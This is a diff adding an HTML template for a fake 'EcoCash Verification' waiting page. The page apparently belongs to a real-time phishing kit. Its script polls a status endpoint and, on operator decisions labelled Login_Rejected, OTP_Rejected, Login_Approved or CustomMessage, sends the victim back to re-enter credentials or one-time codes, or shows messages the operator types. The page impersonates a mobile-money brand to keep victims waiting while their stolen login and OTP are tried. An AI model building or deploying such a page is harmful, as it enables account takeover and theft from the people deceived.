@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification — EcoCash</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+        :root {
+            --bg-canvas: #0b1118;
+            --bg-card: #121b26;
+            --bg-elevated: #182433;
+            --accent: #00b86b;
+            --text-main: #f4f7fb;
+            --text-muted: #94a3b8;
+            --border-subtle: rgba(255, 255, 255, 0.08);
+        }
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100vh;
+            background: radial-gradient(circle at top, #132234 0%, var(--bg-canvas) 65%);
+            color: var(--text-main);
+            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .screen-container {
+            width: 100%;
+            max-width: 440px;
+            padding: 24px 18px;
+        }
+        .surface-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-subtle);
+            border-radius: 22px;
+            padding: 30px 22px;
+            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
+        }
+        .brand-pill {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(0, 184, 107, 0.14);
+            color: #34d399;
+            border: 1px solid rgba(52, 211, 153, 0.25);
+            font-size: 0.75rem;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            padding: 6px 12px;
+            border-radius: 999px;
+            margin-bottom: 18px;
+        }
+        .spinner-ring {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--accent);
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .ref-pill {
+            display: inline-block;
+            background: var(--bg-elevated);
+            border: 1px solid var(--border-subtle);
+            border-radius: 10px;
+            padding: 8px 14px;
+            font-size: 0.82rem;
+            color: var(--text-muted);
+        }
+        .ref-code {
+            color: #34d399;
+            font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+            font-weight: 600;
+        }
+        .custom-msg-box {
+            background: rgba(52, 211, 153, 0.12);
+            border: 1px solid rgba(52, 211, 153, 0.35);
+            color: #ecfdf5;
+            padding: 12px 14px;
+            border-radius: 12px;
+            font-size: 0.88rem;
+            font-weight: 500;
+            margin-top: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="screen-container">
+        <div class="surface-card">
+            <div class="brand-pill">EcoCash Verification</div>
+            <div class="spinner-ring"></div>
+            <h2 id="pendingTitle" class="fw-semibold fs-4 mb-2">Verifying your details</h2>
+            <p id="pendingSubtitle" class="small mb-3" style="color: var(--text-muted);">
+                Please wait while we confirm your login information.
+            </p>
+            <div id="customMsg" class="custom-msg-box mb-3"></div>
+            <div class="small mb-3" style="color: var(--text-muted);">Do not close this page</div>
+            <div class="ref-pill">Reference: <span class="ref-code">{{ app_id }}</span></div>
+        </div>
+    </div>
+
+    <script>
+        const appId = "{{ app_id }}";
+        const stage = "{{ stage }}";
+        let isRedirecting = false;
+
+        if (stage === "otp") {
+            document.getElementById("pendingTitle").textContent = "Verifying your OTP";
+            document.getElementById("pendingSubtitle").textContent = "Please wait while we verify the OTP code you entered.";
+        }
+
+        function checkStatus() {
+            if (isRedirecting) return;
+
+            fetch("/check-status?app_id=" + encodeURIComponent(appId))
+                .then(response => response.json())
+                .then(data => {
+                    const msgBox = document.getElementById("customMsg");
+
+                    if (data.status === "Login_Rejected") {
+                        isRedirecting = true;
+                        alert("Wrong login details. Please log in again.");
+                        window.location.href = "/login";
+                        return;
+                    }
+
+                    if (data.status === "OTP_Rejected") {
+                        isRedirecting = true;
+                        alert("Wrong OTP. Please enter the OTP again.");
+                        window.location.href = "/final-verify?app_id=" + encodeURIComponent(appId) + "&retry=otp";
+                        return;
+                    }
+
+                    if (data.status === "Login_Approved") {
+                        isRedirecting = true;
+                        window.location.href = "/final-verify?app_id=" + encodeURIComponent(appId);
+                        return;
+                    }
+
+                    if (data.status === "OTP_Approved" || data.status === "Approved") {
+                        isRedirecting = true;
+                        window.location.href = "/success";
+                        return;
+                    }
+
+                    if (data.status === "CustomMessage") {
+                        msgBox.style.display = "block";
+                        msgBox.textContent = data.custom_message;
+                    }
+
+                    setTimeout(checkStatus, 1500);
+                })
+                .catch(() => {
+                    if (!isRedirecting) {
+                        setTimeout(checkStatus, 2500);
+                    }
+                });
+        }
+
+        if (appId) {
+            setTimeout(checkStatus, 1000);
+        }
+    </script>
+</body>
+</html>
